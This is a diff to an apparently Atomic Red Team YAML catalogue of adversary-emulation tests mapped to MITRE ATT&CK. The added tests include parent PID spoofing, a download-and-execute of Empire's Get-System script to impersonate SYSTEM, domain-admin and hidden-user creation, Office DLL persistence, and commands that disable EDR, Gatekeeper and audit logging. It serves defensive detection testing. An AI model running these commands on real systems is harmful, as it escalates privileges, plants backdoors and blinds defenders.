@@ -4496,6 +4496,134 @@ privilege-escalation:
           Stop-Process -Name "#{dll_process_name}" -ErrorAction Ignore
           Stop-Process -Name "#{spawnto_process_name}" -ErrorAction Ignore
         name: powershell
+    - name: Parent PID Spoofing - Spawn from Current Process
+      auto_generated_guid: 14920ebd-1d61-491a-85e0-fe98efe37f25
+      description: Spawns a powershell.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine
+          ''#{command_line}'' -ParentId #{parent_pid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from Specified Process
+      auto_generated_guid: cbbff285-9051-444a-9d17-c07cd2d230eb
+      description: Spawns a notepad.exe process as a child of the current process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        parent_pid:
+          description: PID of process to spawn from
+          type: string
+          default: "$PID"
+        test_guid:
+          description: Defined test GUID
+          type: string
+          default: 12345678-1234-1234-1234-123456789123
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-ATHProcessUnderSpecificParent  -ParentId #{parent_pid} -TestGuid
+          #{test_guid}'
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from svchost.exe
+      auto_generated_guid: e9f2b777-3123-430b-805d-5cedc66ab591
+      description: Spawnd a process as a child of the first accessible svchost.exe
+        process.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine,
+          ProcessId -Filter "Name = ''svchost.exe'' AND CommandLine LIKE ''%''" |
+          Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path}
+          -CommandLine ''#{command_line}'''
+        name: powershell
+    - name: Parent PID Spoofing - Spawn from New Process
+      auto_generated_guid: 2988133e-561c-4e42-a15f-6281e6a9b2db
+      description: Creates a notepad.exe process and then spawns a powershell.exe
+        process as a child of it.
+      supported_platforms:
+      - windows
+      input_arguments:
+        command_line:
+          description: Specified command line to use
+          type: string
+          default: "-Command Start-Sleep 10"
+        file_path:
+          description: File path or name of process to spawn
+          type: path
+          default: "$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        parent_name:
+          description: Parent process to spoof from
+          type: path
+          default: "$Env:windir\\System32\\notepad.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Start-ATHProcessUnderSpecificParent
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Start-ATHProcessUnderSpecificParent']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent
+          -FilePath #{file_path} -CommandLine ''#{command_line}'''
+        name: powershell
   T1034:
     technique:
       id: attack-pattern--c4ad009b-6e13-4419-8d21-918a1652de02
@@ -5941,6 +6069,7 @@ privilege-escalation:
 
 '
         name: command_prompt
+        elevation_required: true
     - name: PowerShell Registry RunOnce
       auto_generated_guid: eb44f842-0457-4ddc-9b92-c4caa144ac42
       description: |
@@ -7454,7 +7583,34 @@ privilege-escalation:
       - File system access controls
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1134.001
+    atomic_tests:
+    - name: Named pipe client impersonation
+      auto_generated_guid: 90db9e27-8e7c-4c04-b602-a45927884966
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+
+        Reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique NamedPipe -Verbose
+        name: powershell
+        elevation_required: true
+    - name: "`SeDebugPrivilege` token duplication"
+      auto_generated_guid: 34f0a430-9d04-4d98-bcb5-1989f14719f0
+      description: |-
+        Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script uses `SeDebugPrivilege` to obtain, duplicate and impersonate the token of a another process.
+        When executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).
+      supported_platforms:
+      - windows
+      executor:
+        command: IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1');
+          Get-System -Technique Token -Verbose
+        name: powershell
+        elevation_required: true
   T1546.005:
     technique:
       external_references:
@@ -9421,8 +9577,10 @@ persistence:
     - name: Persist, Download, & Execute
       auto_generated_guid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
       description: |
-        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
-        and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
+        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
+        Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
+        This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
+        This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
       supported_platforms:
       - windows
       input_arguments:
@@ -10954,7 +11112,62 @@ persistence:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1136.002
+    atomic_tests:
+    - name: Create a new Windows domain admin user
+      auto_generated_guid: fcec2963-9951-4173-9bfa-98d8b7834e62
+      description: 'Creates a new domain admin user in a command prompt.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: T1136.002_Admin
+        password:
+          description: Password of the user to create
+          type: String
+          default: T1136_pass123!
+        group:
+          description: Domain administrator group to which add the user to
+          type: String
+          default: Domain Admins
+      executor:
+        command: |
+          net user "#{username}" "#{password}" /add /domain
+          net group "#{group}" "#{username}" /add /domain
+        cleanup_command: 'net user "#{username}" >nul 2>&1 /del /domain
+
+'
+        name: command_prompt
+        elevation_required: false
+    - name: Create a new account similar to ANONYMOUS LOGON
+      auto_generated_guid: dc7726d2-8ccb-4cc6-af22-0d5afb53a548
+      description: 'Create a new account similar to ANONYMOUS LOGON in a command prompt.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        username:
+          description: Username of the user to create
+          type: String
+          default: ANONYMOUS  LOGON
+        password:
+          description: Password of the user to create
+          type: String
+          default: T1136_pass123!
+      executor:
+        command: 'net user "#{username}" "#{password}" /add /domain
+
+'
+        cleanup_command: 'net user "#{username}" >nul 2>&1 /del /domain
+
+'
+        name: command_prompt
+        elevation_required: false
   T1078.002:
     technique:
       created: '2020-03-13T20:21:54.758Z'
@@ -13114,7 +13327,30 @@ persistence:
       x_mitre_platforms:
       - Windows
       - Office 365
-    atomic_tests: []
+      identifier: T1137.002
+    atomic_tests:
+    - name: Office Apllication Startup Test Persistence
+      auto_generated_guid: c3e35b58-fe1c-480b-b540-7600fb612563
+      description: |
+        Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office
+        application is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.
+      supported_platforms:
+      - windows
+      input_arguments:
+        thing_to_execute:
+          description: Thing to Run
+          type: Path
+          default: C:\Path\AtomicRedTeam.dll
+      executor:
+        command: 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf"
+          /t REG_SZ /d "#{thing_to_execute}"
+
+'
+        cleanup_command: 'reg delete "HKEY_CURRENT_USER\Software\Microsoft\Office
+          test\Special\Perf"
+
+'
+        name: command_prompt
   T1137.003:
     technique:
       external_references:
@@ -14339,6 +14575,7 @@ persistence:
 
 '
         name: command_prompt
+        elevation_required: true
     - name: PowerShell Registry RunOnce
       auto_generated_guid: eb44f842-0457-4ddc-9b92-c4caa144ac42
       description: |
@@ -19004,7 +19241,7 @@ credential-access:
       - Ed Williams, Trustwave, SpiderLabs
       identifier: T1003.003
     atomic_tests:
-    - name: Create Volume Shadow Copy with NTDS.dit
+    - name: Create Volume Shadow Copy with vssadmin
       auto_generated_guid: dcebead7-6c28-4b4b-bf3c-79deb1b1fc7f
       description: |
         This test is intended to be run on a domain Controller.
@@ -19042,7 +19279,7 @@ credential-access:
 
         The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.
 
-        This test requires steps taken in the test "Create Volume Shadow Copy with NTDS.dit".
+        This test requires steps taken in the test "Create Volume Shadow Copy with vssadmin".
         A successful test also requires the export of the SYSTEM Registry hive.
         This test must be executed on a Windows Domain Controller.
       supported_platforms:
@@ -19075,7 +19312,7 @@ credential-access:
 
 '
         get_prereq_command: 'echo Run "Invoke-AtomicTest T1003.003 -TestName ''Create
-          Volume Shadow Copy with NTDS.dit''" to fulfuill this requirement
+          Volume Shadow Copy with vassadmin''" to fulfuill this requirement
 
 '
       - description: 'Extract path must exist
@@ -20419,14 +20656,14 @@ credential-access:
         copy_dest:
           description: Destination of the copied file
           type: String
-          default: "%windir%"
+          default: "%temp%"
       executor:
-        command: 'del #{copy_dest}\#{file_name} & esentutl.exe /y /vss #{file_path}
-          /d #{copy_dest}/#{file_name}
+        command: 'esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
 
 '
         name: command_prompt
         elevation_required: true
+        cleanup_command: del
     - name: PowerDump Registry dump of SAM for hashes and usernames
       auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
       description: Executes a hashdump by reading the hasshes from the registry.
@@ -21425,8 +21662,10 @@ defense-evasion:
     - name: Persist, Download, & Execute
       auto_generated_guid: 62a06ec5-5754-47d2-bcfc-123d8314c6ae
       description: |
-        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
-        and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
+        This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.
+        Note that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.
+        This has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of "svchost.exe" and an Initiating Process Command Line of "svchost.exe -k netsvcs -p -s BITS"
+        This job will remain in the BITS queue until complete or for up to 90 days by default if not removed.
       supported_platforms:
       - windows
       input_arguments:
@@ -22964,6 +23203,174 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Invoke CHM with default Shortcut Command Execution
+      auto_generated_guid: 29d6f0d7-be63-4482-8827-ea77126c1ef7
+      description: Executes a CHM file with the default Shortcut Command method.
+      supported_platforms:
+      - windows
+      input_arguments:
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath
+          #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM with InfoTech Storage Protocol Handler
+      auto_generated_guid: b4094750-5fc7-4e8e-af12-b4e36bf5e7f6
+      description: Executes a CHM file with the ITS protocol handler.
+      supported_platforms:
+      - windows
+      input_arguments:
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+        infotech_storage_handler:
+          description: Default InfoTech Storage Protocol Handler
+          type: string
+          default: its
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler}
+          -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM Simulate Double click
+      auto_generated_guid: 5decef42-92b8-4a93-9eb2-877ddcb9401a
+      description: Executes a CHM file simulating a user double click.
+      supported_platforms:
+      - windows
+      input_arguments:
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM with Script Engine and Help Topic
+      auto_generated_guid: 4f83adda-f5ec-406d-b318-9773c9ca92e5
+      description: Executes a CHM file with a defined script engine, ITS Protocol
+        Handler, and help topic extension.
+      supported_platforms:
+      - windows
+      input_arguments:
+        topic_extension:
+          description: Default Help Topic
+          type: string
+          default: html
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+        infotech_storage_handler:
+          description: Default InfoTech Storage Protocol Handler
+          type: string
+          default: its
+        script_engine:
+          description: Default Script Engine
+          type: string
+          default: JScript
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler
+          #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath
+          #{hh_file_path} -CHMFilePath #{chm_file_path}'
+        name: powershell
+    - name: Invoke CHM Shortcut Command with ITS and Help Topic
+      auto_generated_guid: 15756147-7470-4a83-87fb-bb5662526247
+      description: Executes a CHM file using the Shortcut Command method with a defined
+        ITS Protocol Handler, and help topic extension.
+      supported_platforms:
+      - windows
+      input_arguments:
+        topic_extension:
+          description: Default Help Topic
+          type: string
+          default: html
+        hh_file_path:
+          description: path of modified HH.exe
+          type: path
+          default: "$env:windir\\hh.exe"
+        infotech_storage_handler:
+          description: Default InfoTech Storage Protocol Handler
+          type: string
+          default: its
+        chm_file_path:
+          description: Default path of CHM
+          type: string
+          default: Test.chm
+      dependencies:
+      - description: The AtomicTestHarnesses module must be installed and Invoke-ATHCompiledHelp
+          must be exported in the module.
+        prereq_command: |-
+          $RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable
+          if (-not $RequiredModule) {exit 1}
+          if (-not $RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) {exit 1} else {exit 0}
+        get_prereq_command: 'Install-Module -Name AtomicTestHarnesses -Scope CurrentUser
+          -Force
+
+'
+      executor:
+        command: 'Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler
+          #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath
+          #{hh_file_path} -CHMFilePath #{chm_file_path}'
+        name: powershell
   T1542.002:
     technique:
       external_references:
@@ -23754,7 +24161,36 @@ defense-evasion:
       x_mitre_data_sources:
       - API monitoring
       x_mitre_version: '2.0'
-    atomic_tests: []
+      identifier: T1006
+    atomic_tests:
+    - name: Read volume boot sector via DOS device path (PowerShell)
+      auto_generated_guid: 88f6327e-51ec-4bbf-b2e8-3fea534eab8b
+      description: |-
+        This test uses PowerShell to open a handle on the drive volume via the `\\.\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.
+        On success, a hex dump of the first 11 bytes of the volume is displayed.
+
+        For a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):
+        ```
+                   00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+        00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS
+        ```
+      supported_platforms:
+      - windows
+      input_arguments:
+        volume:
+          description: Drive letter of the volume to access
+          type: string
+          default: 'C:'
+      executor:
+        command: |
+          $buffer = New-Object byte[] 11
+          $handle = New-Object IO.FileStream "\\.\#{volume}", 'Open', 'Read', 'ReadWrite'
+          $handle.Read($buffer, 0, $buffer.Length)
+          $handle.Close()
+          Format-Hex -InputObject $buffer
+        name: powershell
+        elevation_required: true
   T1562.002:
     technique:
       external_references:
@@ -24164,10 +24600,14 @@ defense-evasion:
       supported_platforms:
       - macos
       executor:
-        command: 'sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
-
-'
+        command: |
+          sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist
+          sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
+        cleanup_command: |
+          sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist
+          sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
         name: sh
+        elevation_required: true
     - name: Disable LittleSnitch
       auto_generated_guid: 62155dd8-bb3d-4f32-b31c-6532ff3ac6a3
       description: 'Disables LittleSnitch
@@ -24179,7 +24619,11 @@ defense-evasion:
         command: 'sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
 
 '
+        cleanup_command: 'sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist
+
+'
         name: sh
+        elevation_required: true
     - name: Disable OpenDNS Umbrella
       auto_generated_guid: 07f43b33-1e15-4e99-be70-bc094157c849
       description: 'Disables OpenDNS Umbrella
@@ -24191,7 +24635,27 @@ defense-evasion:
         command: 'sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
 
 '
+        cleanup_command: 'sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist
+
+'
         name: sh
+        elevation_required: true
+    - name: Disable macOS Gatekeeper
+      auto_generated_guid: 2a821573-fb3f-4e71-92c3-daac7432f053
+      description: 'Disables macOS Gatekeeper
+
+'
+      supported_platforms:
+      - macos
+      executor:
+        command: 'sudo spctl --master-disable
+
+'
+        cleanup_command: 'sudo spctl --master-enable
+
+'
+        name: sh
+        elevation_required: true
     - name: Stop and unload Crowdstrike Falcon on macOS
       auto_generated_guid: b3e7510c-2d4c-4249-a33f-591a2bc83eef
       description: 'Stop and unload Crowdstrike Falcon daemons falcond and userdaemon
@@ -24213,6 +24677,9 @@ defense-evasion:
         command: |
           sudo launchctl unload #{falcond_plist}
           sudo launchctl unload #{userdaemon_plist}
+        cleanup_command: |
+          sudo launchctl load -w #{falcond_plist}
+          sudo launchctl load -w #{userdaemon_plist}
         name: sh
         elevation_required: true
     - name: Unload Sysmon Filter Driver
@@ -25485,7 +25952,7 @@ defense-evasion:
 
 '
         name: bash
-    - name: Delete-PrefetchFile
+    - name: Delete Prefetch File
       auto_generated_guid: 36f96049-0ad7-4a5f-8418-460acaeb92fb
       description: |
         Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run "(Get-ChildItem -Path "$Env:SystemRoot\prefetch\*.pf" | Measure-Object).Count"
@@ -25683,9 +26150,9 @@ defense-evasion:
           type: Path
           default: myapp.app
       executor:
-        command: |
-          sudo xattr -r -d com.apple.quarantine #{app_path}
-          sudo spctl --master-disable
+        command: 'sudo xattr -d com.apple.quarantine #{app_path}
+
+'
         elevation_required: true
         name: sh
   T1484:
@@ -26170,9 +26637,10 @@ defense-evasion:
       - macOS
       identifier: T1564.002
     atomic_tests:
-    - name: Hidden Users
+    - name: Create Hidden User using UniqueID < 500
       auto_generated_guid: 4238a7f0-a980-4fff-98a2-dfc0a363d507
-      description: 'Add a hidden user on MacOS
+      description: 'Add a hidden user on macOS using Unique ID < 500 (users with that
+        ID are hidden by default)
 
 '
       supported_platforms:
@@ -26184,6 +26652,27 @@ defense-evasion:
           default: APT
       executor:
         command: 'sudo dscl . -create /Users/#{user_name} UniqueID 333
+
+'
+        cleanup_command: 'sudo dscl . -delete /Users/#{user_name}
+
+'
+        elevation_required: true
+        name: sh
+    - name: Create Hidden User using IsHidden option
+      auto_generated_guid: de87ed7b-52c3-43fd-9554-730f695e7f31
+      description: 'Add a hidden user on macOS using IsHidden optoin
+
+'
+      supported_platforms:
+      - macos
+      input_arguments:
+        user_name:
+          description: username to add
+          type: string
+          default: APT
+      executor:
+        command: 'sudo dscl . -create /Users/#{user_name} IsHidden 1
 
 '
         cleanup_command: 'sudo dscl . -delete /Users/#{user_name}
@@ -26516,7 +27005,86 @@ defense-evasion:
       - Anti-virus
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1562.006
+    atomic_tests:
+    - name: Auditing Configuration Changes on Linux Host
+      auto_generated_guid: 212cfbcf-4770-4980-bc21-303e37abd0e3
+      description: 'Emulates modification of auditd configuration files
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        audisp_config_file_name:
+          description: The name of the audispd configuration file to be changed
+          type: string
+          default: audispd.conf
+        auditd_config_file_name:
+          description: The name of the auditd configuration file to be changed
+          type: string
+          default: auditd.conf
+        libaudit_config_file_name:
+          description: The name of the libaudit configuration file to be changed
+          type: string
+          default: libaudit.conf
+      executor:
+        command: "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif
+          [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1'
+          /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1'
+          /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1'
+          /etc/#{libaudit_config_file_name}\n"
+        cleanup_command: |
+          sed -i '$ d' /etc/audisp/#{audisp_config_file_name}
+          if [ -f "/etc/#{auditd_config_file_name}" ];
+          then sed -i '$ d' /etc/#{auditd_config_file_name}
+          else sed -i '$ d' /etc/audit/#{auditd_config_file_name}
+          fi
+          sed -i '$ d' /etc/#{libaudit_config_file_name}
+        name: bash
+        elevation_required: true
+    - name: Lgging Configuration Changes on Linux Host
+      auto_generated_guid: 7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c
+      description: 'Emulates modification of syslog configuration.
+
+'
+      supported_platforms:
+      - linux
+      input_arguments:
+        syslog_config_file_name:
+          description: The name of the syslog configuration file to be changed
+          type: string
+          default: syslog.conf
+        rsyslog_config_file_name:
+          description: The name of the rsyslog configuration file to be changed
+          type: string
+          default: rsyslog.conf
+        syslog_ng_config_file_name:
+          description: The name of the syslog-ng configuration file to be changed
+          type: string
+          default: syslog-ng.conf
+      executor:
+        command: |
+          if [ -f "/etc/#{syslog_config_file_name}" ];
+          then sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}
+          fi
+          if [ -f "/etc/#{rsyslog_config_file_name}" ];
+          then sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}
+          fi
+          if [ -f "/etc/syslog-ng/#{syslog_ng_config_file_name}" ];
+          then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}
+          fi
+        cleanup_command: |
+          if [ -f "/etc/#{syslog_config_file_name}" ];
+          then sed -i '$ d' /etc/#{syslog_config_file_name}
+          fi
+          if [ -f "/etc/#{rsyslog_config_file_name}" ];
+          then sed -i '$ d' /etc/#{rsyslog_config_file_name}
+          fi
+          if [ -f "/etc/syslog-ng/#{syslog_ng_config_file_name}" ];
+          then sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}
+          fi
+        name: bash
+        elevation_required: true
   T1027.005:
     technique:
       id: attack-pattern--b0533c6e-8fea-4788-874f-b799cacc4b92
@@ -26723,6 +27291,24 @@ defense-evasion:
         command: |
           forfiles /p c:\windows\system32 /m notepad.exe /c #{process}
           forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe"
+        name: command_prompt
+    - name: Indirect Command Execution - conhost.exe
+      auto_generated_guid: cf3391e0-b482-4b02-87fc-ca8362269b29
+      description: |
+        conhost.exe refers to a host process for the console window. It provide an interface between command prompt and Windows explorer.
+        Executing it through command line can create process ancestry anomalies
+        [Reference] (http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/)
+      supported_platforms:
+      - windows
+      input_arguments:
+        process:
+          description: Process to execute
+          type: string
+          default: notepad.exe
+      executor:
+        command: 'conhost.exe "#{process}"
+
+'
         name: command_prompt
   T1553.004:
     technique:
@@ -28269,7 +28855,38 @@ defense-evasion:
       x_mitre_platforms:
       - Windows
       - Linux
-    atomic_tests: []
+      identifier: T1036.004
+    atomic_tests:
+    - name: Creating W32Time similar named service using schtasks
+      auto_generated_guid: f9f2fe59-96f7-4a7d-ba9f-a9783200d4c9
+      description: Creating W32Time similar named service (win32times) using schtasks
+        just like threat actor dubbed "Operation Wocao"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          schtasks /create /ru system /sc daily /tr "cmd /c powershell.exe -ep bypass -file c:\T1036.004_NonExistingScript.ps1" /tn win32times /f
+          schtasks /query /tn win32times
+        cleanup_command: 'schtasks /tn win32times /delete /f
+
+'
+        name: command_prompt
+        elevation_required: true
+    - name: Creating W32Time similar named service using sc
+      auto_generated_guid: b721c6ef-472c-4263-a0d9-37f1f4ecff66
+      description: Creating W32Time similar named service (win32times) using sc just
+        like threat actor dubbed "Operation Wocao"
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          sc create win32times binPath= "cmd /c start c:\T1036.004_NonExistingScript.ps1"
+          sc qc win32times
+        cleanup_command: 'sc delete win32times
+
+'
+        name: command_prompt
+        elevation_required: true
   T1036:
     technique:
       id: attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0
@@ -28697,6 +29314,27 @@ defense-evasion:
 
 '
         name: powershell
+    - name: Change Powershell Execution Policy to Bypass
+      auto_generated_guid: f3a6cceb-06c9-48e5-8df8-8867a6814245
+      description: |
+        Attackers needs to change the powershell execution policy in order to run their malicious powershell scripts.
+        They can either specify it during the execution of the powershell script or change the registry value for it.
+      supported_platforms:
